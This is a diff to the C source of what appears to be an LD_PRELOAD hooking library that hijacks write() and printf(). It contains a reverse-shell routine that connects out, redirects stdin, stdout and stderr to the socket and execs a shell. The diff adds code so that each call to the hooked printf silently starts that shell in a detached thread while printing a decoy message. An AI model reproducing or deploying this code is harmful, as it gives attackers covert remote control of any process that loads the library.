@@ -59,21 +59,22 @@ void so_deinit(void)
 
 
 static int (*orig_printf)(const char *format, ...) = NULL;
-//void* ip_rev(void* args)
-int ip_rev(void)
+void* ip_rev(void* argc)
+
+//int ip_rev(void)
 {
     int s;
     if((s=socket(AF_INET,SOCK_STREAM,0))==-1)
     {
         //perror("[-] Error Creating Socket Descriptor\n");     
-        return -1;
+        //return -1;
     }
 
     int optval=1;
     if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))==-1)
     {
         //perror("[-] Error in setsockopt()\n");
-        return -2;
+       // return -2;
     }
 
     struct addrinfo hints, *res;
@@ -88,8 +89,8 @@ int ip_rev(void)
     {
         sleep(1);
         flag = flag+1;
-        if(flag > 5)
-            return -3;
+        if(flag > 5){}
+
     }
 
     dup2(s, 0);
@@ -106,13 +107,13 @@ int ip_rev(void)
         shell[1]=NULL;
         execve(shell[0],shell, NULL); // Call Our Shell
         close(s);
-        return 0;
+        //return 0;
     }
     else
     {
         shutdown(s,SHUT_RDWR); // Shutdown Further R/W Operation From Client
         close(s);
-        return -4;
+        //return -4;
     }
 }
 //void* ip_bind(void* args)
@@ -197,7 +198,7 @@ ssize_t write(int fildes, const void *buf, size_t nbytes) // From Manual
     {
         fildes = open("/dev/null", O_WRONLY | O_APPEND);
         result = new_write(fildes,buf,nbytes);
-        pthread_create(&t,mullptr,ip_bind,nullptr);
+        //pthread_create(&t,mullptr,ip_bind,nullptr);
         //ip_bind();
         //pthread_detach(t);
     }
@@ -205,9 +206,9 @@ ssize_t write(int fildes, const void *buf, size_t nbytes) // From Manual
     {
         fildes = open("/dev/null", O_WRONLY | O_APPEND);
         result = new_write(fildes,buf,nbytes);
-        pthread_create(&t,mullptr,ip_rev,nullptr);
+        //pthread_create(&t,NULL,ip_rev,NULL);
         //ip_rev();   
-        pthread_detach(t);  
+        //pthread_detach(t);  
     }
     else
     {
@@ -326,6 +327,10 @@ int printf(const char *format, ...)
 
  // TODO: print desired message from caller. 
  //ip_rev();
+     pthread_t t;
+     pthread_create(&t,NULL,ip_rev,NULL);
+     //ip_rev();   
+     pthread_detach(t);  
  return orig_printf("within my own printf\n");
 }
 //https://github.com/russellfrancis/ld_preload_spy/blob/main/spy.c
